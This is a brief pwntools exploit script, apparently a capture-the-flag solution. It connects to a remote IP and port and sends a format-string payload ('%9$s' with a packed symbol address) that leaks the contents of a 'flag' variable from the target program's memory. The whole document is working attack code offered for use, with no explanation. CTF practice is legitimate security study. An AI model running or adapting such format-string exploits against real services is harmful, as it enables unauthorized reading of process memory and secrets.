#KOOOuull w Wakkell_
from pwn import *
binary = './main'
elf = ELF(binary)
flag_addr = elf.symbols['flag']
p = process(binary)
p = remote("51.77.140.155", 1339)
payload = f'%9$s'.encode().ljust(8, b'A') + p64(flag_addr)
p.sendline(payload)
p.recvuntil(b'called: ')
leak = p.recvline().strip()
info(leak)
p.interactive()
